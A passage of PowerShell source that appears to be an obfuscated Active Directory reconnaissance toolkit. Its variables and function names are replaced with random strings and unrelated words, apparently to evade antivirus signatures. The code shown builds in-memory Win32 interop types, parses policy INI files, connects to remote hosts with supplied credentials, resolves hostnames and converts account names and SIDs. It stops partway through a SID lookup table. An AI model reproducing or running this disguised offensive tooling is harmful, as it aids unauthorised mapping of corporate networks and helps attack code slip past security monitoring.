



function stimulation {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $fGXmfaVn99 = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $hwlvbWxa99 = $fGXmfaVn99.GetAssemblies()

    foreach ($qbcOYudY99 in $hwlvbWxa99) {
        if ($qbcOYudY99.FullName -and ($qbcOYudY99.FullName.Split(',')[0] -eq $ModuleName)) {
            return $qbcOYudY99
        }
    }

    $SFfwCglI99 = New-Object Reflection.AssemblyName($ModuleName)
    $JXWXuoyG99 = $fGXmfaVn99
    $uwRUoNVk99 = $JXWXuoyG99.DefineDynamicAssembly($SFfwCglI99, 'Run')
    $XHavRmYS99 = $uwRUoNVk99.DefineDynamicModule($ModuleName, $False)

    return $XHavRmYS99
}


function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $dZlQLIIf99,

        [Switch]
        $SetLastError
    )

    $hqDcSuel99 = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $hqDcSuel99['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $hqDcSuel99['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $hqDcSuel99['Charset'] = $Charset }
    if ($SetLastError) { $hqDcSuel99['SetLastError'] = $SetLastError }
    if ($dZlQLIIf99) { $hqDcSuel99['EntryPoint'] = $dZlQLIIf99 }

    New-Object PSObject -Property $hqDcSuel99
}


function cocksure
{

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $dZlQLIIf99,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $LcMGhgDM99 = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $LcMGhgDM99[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $LcMGhgDM99[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            if (!$LcMGhgDM99.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $LcMGhgDM99[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $LcMGhgDM99[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $BXxAvYPV99 = $LcMGhgDM99[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            $i = 1
            foreach($CFBMZvfz99 in $ParameterTypes)
            {
                if ($CFBMZvfz99.IsByRef)
                {
                    [void] $BXxAvYPV99.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DpwEaqwy99 = [Runtime.InteropServices.DllImportAttribute]
            $ZYUnHVGz99 = $DpwEaqwy99.GetField('SetLastError')
            $ZjVIUxey99 = $DpwEaqwy99.GetField('CallingConvention')
            $FAEkxRZo99 = $DpwEaqwy99.GetField('CharSet')
            $rjrxzEUD99 = $DpwEaqwy99.GetField('EntryPoint')
            if ($SetLastError) { $ajUlweUF99 = $True } else { $ajUlweUF99 = $False }

            if ($PSBoundParameters['EntryPoint']) { $AiZsLBYC99 = $dZlQLIIf99 } else { $AiZsLBYC99 = $FunctionName }

            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $deiRDTst99 = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($ZYUnHVGz99,
                                           $ZjVIUxey99,
                                           $FAEkxRZo99,
                                           $rjrxzEUD99),
                [Object[]] @($ajUlweUF99,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $AiZsLBYC99))

            $BXxAvYPV99.SetCustomAttribute($deiRDTst99)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $LcMGhgDM99
        }

        $aKTJOAyg99 = @{}

        foreach ($Key in $LcMGhgDM99.Keys)
        {
            $Type = $LcMGhgDM99[$Key].CreateType()

            $aKTJOAyg99[$Key] = $Type
        }

        return $aKTJOAyg99
    }
}


function refute {

    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $nYrHSNxZ99,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $MHKBoOzT99,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($nYrHSNxZ99))
    }

    $hXmNDTxl99 = $Type -as [Type]

    $VcSkUAXH99 = $Module.DefineEnum($nYrHSNxZ99, 'Public', $hXmNDTxl99)

    if ($Bitfield)
    {
        $ucaDnPHp99 = [FlagsAttribute].GetConstructor(@())
        $jaodYwZT99 = New-Object Reflection.Emit.CustomAttributeBuilder($ucaDnPHp99, @())
        $VcSkUAXH99.SetCustomAttribute($jaodYwZT99)
    }

    foreach ($Key in $MHKBoOzT99.Keys)
    {
        $null = $VcSkUAXH99.DefineLiteral($Key, $MHKBoOzT99[$Key] -as $hXmNDTxl99)
    }

    $VcSkUAXH99.CreateType()
}


function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $YYkEUwAF99,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $ZdQQYlky99,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $YYkEUwAF99
        Type = $Type -as [Type]
        Offset = $ZdQQYlky99
        MarshalAs = $MarshalAs
    }
}


function Bloemfontein
{

    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $nYrHSNxZ99,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $FtMzPUIu99,

        [Reflection.Emit.PackingSize]
        $oWhKSZve99 = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $zQrhCQHR99
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($nYrHSNxZ99))
    }

    [Reflection.TypeAttributes] $ebtphzWw99 = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($zQrhCQHR99)
    {
        $ebtphzWw99 = $ebtphzWw99 -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $ebtphzWw99 = $ebtphzWw99 -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $cikYVePS99 = $Module.DefineType($nYrHSNxZ99, $ebtphzWw99, [ValueType], $oWhKSZve99)
    $KTSaNCWc99 = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $MLwugEMf99 = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $xGEvFnsk99 = New-Object Hashtable[]($FtMzPUIu99.Count)

    foreach ($Field in $FtMzPUIu99.Keys)
    {
        $Index = $FtMzPUIu99[$Field]['Position']
        $xGEvFnsk99[$Index] = @{FieldName = $Field; Properties = $FtMzPUIu99[$Field]}
    }

    foreach ($Field in $xGEvFnsk99)
    {
        $DnhNyjJQ99 = $Field['FieldName']
        $HwGGydRg99 = $Field['Properties']

        $ZdQQYlky99 = $HwGGydRg99['Offset']
        $Type = $HwGGydRg99['Type']
        $MarshalAs = $HwGGydRg99['MarshalAs']

        $uXUhzUXP99 = $cikYVePS99.DefineField($DnhNyjJQ99, $Type, 'Public')

        if ($MarshalAs)
        {
            $ScTwRnrj99 = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $mRpQnNeB99 = New-Object Reflection.Emit.CustomAttributeBuilder($KTSaNCWc99,
                    $ScTwRnrj99, $MLwugEMf99, @($Size))
            }
            else
            {
                $mRpQnNeB99 = New-Object Reflection.Emit.CustomAttributeBuilder($KTSaNCWc99, [Object[]] @($ScTwRnrj99))
            }

            $uXUhzUXP99.SetCustomAttribute($mRpQnNeB99)
        }

        if ($zQrhCQHR99) { $uXUhzUXP99.SetOffset($ZdQQYlky99) }
    }

    $btqgDEZX99 = $cikYVePS99.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $FkOGTQVU99 = $btqgDEZX99.GetILGenerator()
    $FkOGTQVU99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $cikYVePS99)
    $FkOGTQVU99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $FkOGTQVU99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $FkOGTQVU99.Emit([Reflection.Emit.OpCodes]::Ret)

    $YsXQOxeL99 = $cikYVePS99.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $cikYVePS99,
        [Type[]] @([IntPtr]))
    $XhCmOrVU99 = $YsXQOxeL99.GetILGenerator()
    $XhCmOrVU99.Emit([Reflection.Emit.OpCodes]::Nop)
    $XhCmOrVU99.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $XhCmOrVU99.Emit([Reflection.Emit.OpCodes]::Ldtoken, $cikYVePS99)
    $XhCmOrVU99.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $XhCmOrVU99.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $XhCmOrVU99.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $cikYVePS99)
    $XhCmOrVU99.Emit([Reflection.Emit.OpCodes]::Ret)

    $cikYVePS99.CreateType()
}



Function pecuniary {

    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]$Type = [int],

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]$Alias,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$iAyjnmdV99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]$YYkEUwAF99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$PfGZCWbj99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$fpuegsKD99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$QyTPJQog99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$oDHiRjlQ99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$OGvdUjTG99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$vvtqofMo99 = '__AllParameterSets',

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$wCAUHMGW99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$RzayBqjt99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$LcyTQXqC99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$iIdjiSdu99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$dMogvyBr99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$WxVbOIvu99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$FYfCsfRE99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$rLyGtNsY99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$RpdObOoz99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$DLPTzaDw99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$rmWNohKB99,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
            }
            $true
        })]
        $OWeIcYSq99 = $false,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$NnRpseTT99,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if($_.GetType().Name -notmatch 'Dictionary') {
                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
            }
            $true
        })]
        $yvSIOGSe99
    )

    Begin {
        $goGDbArn99 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $hlZFNTRC99 = (Get-Command _temp).Parameters.Keys
    }

    Process {
        if($NnRpseTT99) {
            $ZQWiYaZd99 = $yvSIOGSe99.Keys | Where-Object { $hlZFNTRC99 -notcontains $_ }
            ForEach($CFBMZvfz99 in $ZQWiYaZd99) {
                if ($CFBMZvfz99) {
                    Set-Variable -Name $CFBMZvfz99 -Value $yvSIOGSe99.$CFBMZvfz99 -Scope 1 -Force
                }
            }
        }
        else {
            $bGXnvTvp99 = @()
            $bGXnvTvp99 = $PSBoundParameters.GetEnumerator() |
                        ForEach-Object {
                            if($_.Value.PSobject.Methods.Name -match '^Equals$') {
                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                if($_.Value -ne (Get-Variable -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($bGXnvTvp99) {
                $bGXnvTvp99 | ForEach-Object {[void]$PSBoundParameters.Remove($_)}
            }

            $qBCjeGYP99 = (Get-Command -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        Where-Object { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            Select-Object -ExpandProperty Key |
                                                Where-Object { $PSBoundParameters.Keys -notcontains $_ }

            $tmp = $null
            ForEach ($CFBMZvfz99 in $qBCjeGYP99) {
                $mQeOqZcv99 = Get-Variable -Name $CFBMZvfz99 -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($CFBMZvfz99, [ref]$tmp) -and $mQeOqZcv99) {
                    $PSBoundParameters.$CFBMZvfz99 = $mQeOqZcv99
                }
            }

            if($OWeIcYSq99) {
                $PUtjavdT99 = $OWeIcYSq99
            }
            else {
                $PUtjavdT99 = $goGDbArn99
            }

            $SXuMKtMD99 = {Get-Variable -Name $_ -ValueOnly -Scope 0}

            $mkmzHsxy99 = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
            $ZXXbYTvt99 = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
            $CAtPaotF99 = '^Alias$'
            $lumAYkds99 = New-Object -TypeName System.Management.Automation.ParameterAttribute

            switch -regex ($PSBoundParameters.Keys) {
                $mkmzHsxy99 {
                    Try {
                        $lumAYkds99.$_ = . $SXuMKtMD99
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }

            if($PUtjavdT99.Keys -contains $Name) {
                $PUtjavdT99.$Name.Attributes.Add($lumAYkds99)
            }
            else {
                $YLrmaQgt99 = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $ZXXbYTvt99 {
                        Try {
                            $QGcVwvGJ99 = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $SXuMKtMD99) -ErrorAction Stop
                            $YLrmaQgt99.Add($QGcVwvGJ99)
                        }
                        Catch { $_ }
                        continue
                    }
                    $CAtPaotF99 {
                        Try {
                            $duhNGmSg99 = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $SXuMKtMD99) -ErrorAction Stop
                            $YLrmaQgt99.Add($duhNGmSg99)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $YLrmaQgt99.Add($lumAYkds99)
                $CFBMZvfz99 = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $YLrmaQgt99)
                $PUtjavdT99.Add($Name, $CFBMZvfz99)
            }
        }
    }

    End {
        if(!$NnRpseTT99 -and !$OWeIcYSq99) {
            $PUtjavdT99
        }
    }
}


function brushed {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $FwMcWEEs99
    )

    BEGIN {
        $cdhpdjRy99 = @{}
    }

    PROCESS {
        ForEach ($HopMlfhE99 in $Path) {
            if (($HopMlfhE99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $PYpySBmA99 = (New-Object System.Uri($HopMlfhE99)).Host
                if (-not $cdhpdjRy99[$PYpySBmA99]) {
                    Kamehameha -ComputerName $PYpySBmA99 -Credential $tYWiEqAT99
                    $cdhpdjRy99[$PYpySBmA99] = $True
                }
            }

            if (Test-Path -Path $HopMlfhE99) {
                if ($PSBoundParameters['OutputObject']) {
                    $mnEeDUvA99 = New-Object PSObject
                }
                else {
                    $mnEeDUvA99 = @{}
                }
                Switch -Regex -File $HopMlfhE99 {
                    "^\[(.+)\]" # Section
                    {
                        $JVJwUsqD99 = $matches[1].Trim()
                        if ($PSBoundParameters['OutputObject']) {
                            $JVJwUsqD99 = $JVJwUsqD99.Replace(' ', '')
                            $yhQBCcdy99 = New-Object PSObject
                            $mnEeDUvA99 | Add-Member Noteproperty $JVJwUsqD99 $yhQBCcdy99
                        }
                        else {
                            $mnEeDUvA99[$JVJwUsqD99] = @{}
                        }
                        $SChFfMYT99 = 0
                    }
                    "^(;.*)$" # Comment
                    {
                        $Value = $matches[1].Trim()
                        $SChFfMYT99 = $SChFfMYT99 + 1
                        $Name = 'Comment' + $SChFfMYT99
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $mnEeDUvA99.$JVJwUsqD99 | Add-Member Noteproperty $Name $Value
                        }
                        else {
                            $mnEeDUvA99[$JVJwUsqD99][$Name] = $Value
                        }
                    }
                    "(.+?)\s*=(.*)" # Key
                    {
                        $Name, $Value = $matches[1..2]
                        $Name = $Name.Trim()
                        $NUMxKIRl99 = $Value.split(',') | ForEach-Object { $_.Trim() }


                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $mnEeDUvA99.$JVJwUsqD99 | Add-Member Noteproperty $Name $NUMxKIRl99
                        }
                        else {
                            $mnEeDUvA99[$JVJwUsqD99][$Name] = $NUMxKIRl99
                        }
                    }
                }
                $mnEeDUvA99
            }
        }
    }

    END {
        $cdhpdjRy99.Keys | refrigerants
    }
}


function skirmishes {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $AhOZlceN99,

        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $imdwOpZa99 = ',',

        [Switch]
        $oDHqDDEQ99
    )

    BEGIN {
        $DgBRLxFc99 = [IO.Path]::GetFullPath($PSBoundParameters['Path'])
        $CIUDdXYv99 = [System.IO.File]::Exists($DgBRLxFc99)

        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex'
        $Null = $Mutex.WaitOne()

        if ($PSBoundParameters['Append']) {
            $zTmpJsss99 = [System.IO.FileMode]::Append
        }
        else {
            $zTmpJsss99 = [System.IO.FileMode]::Create
            $CIUDdXYv99 = $False
        }

        $EGQdGrVS99 = New-Object IO.FileStream($DgBRLxFc99, $zTmpJsss99, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $arDjnAgZ99 = New-Object System.IO.StreamWriter($EGQdGrVS99)
        $arDjnAgZ99.AutoFlush = $True
    }

    PROCESS {
        ForEach ($Entry in $AhOZlceN99) {
            $ScZbtcNW99 = ConvertTo-Csv -InputObject $Entry -Delimiter $imdwOpZa99 -NoTypeInformation

            if (-not $CIUDdXYv99) {
                $ScZbtcNW99 | ForEach-Object { $arDjnAgZ99.WriteLine($_) }
                $CIUDdXYv99 = $True
            }
            else {
                $ScZbtcNW99[1..($ScZbtcNW99.Length-1)] | ForEach-Object { $arDjnAgZ99.WriteLine($_) }
            }
        }
    }

    END {
        $Mutex.ReleaseMutex()
        $arDjnAgZ99.Dispose()
        $EGQdGrVS99.Dispose()
    }
}


function bootstrap {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tdrFALUN99 = $Env:COMPUTERNAME
    )

    PROCESS {
        ForEach ($BoJggNks99 in $tdrFALUN99) {
            try {
                @(([Net.Dns]::GetHostEntry($BoJggNks99)).AddressList) | ForEach-Object {
                    if ($_.AddressFamily -eq 'InterNetwork') {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'ComputerName' $BoJggNks99
                        $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                        $Out
                    }
                }
            }
            catch {
                Write-Verbose "[bootstrap] Could not resolve $BoJggNks99 to an IP Address."
            }
        }
    }
}


function nonstick {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        $FabcFZmH99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $JyLWWiSV99 = @{}
        if ($PSBoundParameters['Domain']) { $JyLWWiSV99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Server']) { $JyLWWiSV99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['Credential']) { $JyLWWiSV99['Credential'] = $tYWiEqAT99 }
    }

    PROCESS {
        ForEach ($Object in $FabcFZmH99) {
            $Object = $Object -Replace '/','\'

            if ($PSBoundParameters['Credential']) {
                $DN = oared -Identity $Object -OutputType 'DN' @DomainSearcherArguments
                if ($DN) {
                    $thGIxDFy99 = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    $OvZZajfU99 = $DN.Split(',')[0].split('=')[1]

                    $JyLWWiSV99['Identity'] = $OvZZajfU99
                    $JyLWWiSV99['Domain'] = $thGIxDFy99
                    $JyLWWiSV99['Properties'] = 'objectsid'
                    nostrums @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $JXWXuoyG99 = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters['Domain']) {
                        $JyLWWiSV99 = @{}
                        $JXWXuoyG99 = (foretasted @DomainSearcherArguments).Name
                    }

                    $Obj = (New-Object System.Security.Principal.NTAccount($JXWXuoyG99, $Object))
                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose "[nonstick] Error converting $JXWXuoyG99\$Object : $_"
                }
            }
        }
    }
}


function recollection {

    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        $KzjQfIqV99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $EWGQOOGJ99 = @{}
        if ($PSBoundParameters['Domain']) { $EWGQOOGJ99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Server']) { $EWGQOOGJ99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['Credential']) { $EWGQOOGJ99['Credential'] = $tYWiEqAT99 }
    }

    PROCESS {
        ForEach ($KNzOOYde99 in $KzjQfIqV99) {
            $KNzOOYde99 = $KNzOOYde99.trim('*')
            try {
                Switch ($KNzOOYde99) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
